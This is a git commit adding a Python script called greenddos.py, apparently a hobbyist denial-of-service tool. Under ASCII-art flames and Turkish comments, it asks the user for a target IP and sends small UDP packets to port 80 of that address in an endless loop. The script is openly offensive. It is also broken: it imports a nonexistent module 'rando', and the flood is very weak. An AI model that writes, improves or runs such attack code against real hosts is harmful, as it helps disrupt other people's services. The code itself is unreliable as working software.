c6e0ac256a33760e3c059450214b0dd589addb2a
jsjdndjndmsn <152083411+greensleep1646@users.noreply.github.com>
2023-12-27 22:07:15 +0300

    Create greenddos.py

---
+++ greenddos.py
@@ -0,0 +1,134 @@
+print("""
+
+
+
+                            (
+
+                .            )        )
+
+                         (  (|              .
+
+                     )   )\/ ( ( (
+
+             *  (   ((  /     ))\))  (  )    )
+
+           (     \   )\(          |  ))( )  (|
+
+           >)     ))/   |          )/  \((  ) \
+
+           (     (      .        -.     V )/   )(    (
+
+            \   /     .   \            .       \))   ))
+
+              )(      (  | |   )            .    (  /
+
+             )(    ,'))     \ /          \( `.    )
+
+             (\>  ,'/__      ))            __`.  /
+
+            ( \   | /  ___   ( \/     ___   \ | ( (
+
+             \.)  |/  /   \__      __/   \   \|  ))
+
+            .  \. |>  \      | __ |      /   <|  /
+
+                 )/    \____/ :..: \____/     \ <
+
+          )   \ (|__  .      / ;: \          __| )  (
+
+         ((    )\)  ~--_     --  --      _--~    /  ))
+
+          \    (    |  ||               ||  |   (  /
+
+                \.  |  ||_             _||  |  /
+
+                  > :  |  ~V+-I_I_I-+V~  |  : (.
+
+                 (  \:  T\   _     _   /T  : ./
+
+                  \  :    T^T T-+-T T^T    ;<
+
+                   \..`_       -+-       _'  )
+
+         )            . `--=.._____..=--'. ./         (
+
+        ((     ) (          )             (     ) (   )>
+
+         > \/^/) )) (   ( /(.      ))     ))._/(__))./ (_.
+
+        (  _../ ( \))    )   \ (  / \.  ./ ||  ..__:|  _. \
+
+        |  \__.  ) |   (/  /: :)) |   \/   |(  <.._  )|  ) )
+
+       ))  _./   |  )  ))  __  <  | :(     :))   .//( :  : |
+
+       (: <     ):  --:   ^  \  )(   )\/:   /   /_/ ) :._) :
+
+        \..)   (_..  ..  :    :  : .(   \..:..    ./__.  ./
+
+""")
+
+
+
+print("CODED BY/GREENSLEEP")
+
+                                                                                       
+
+
+print("greenddos... ")
+
+
+
+
+
+import time
+
+import socket
+
+import rando
+
+
+
+def ddos_attack(target_ip):
+
+    packet = b"green"
+
+
+
+    interval = 0.5  # Paket gönderme aralığı (saniye)
+
+    
+
+    while True:
+
+        try:
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+            s.connect((target_ip, 80))
+
+            s.sendto(packet, (target_ip, 80))
+
+            s.close()
+
+            print("Paket gönderildi: greenDDOS")
+
+            time.sleep(interval)
+
+        except socket.error:
+
+            print("Bağlantı hatası! Hedef IP'yi kontrol edin.")
+
+            break
+
+
+
+# Hedef IP'yi kullanıcıdan alalım
+
+target_ip = input("Hedef IP adresini girin: ")
+
+
+
+# DDoS saldırısını başlatalım
+
+ddos_attack(target_ip)
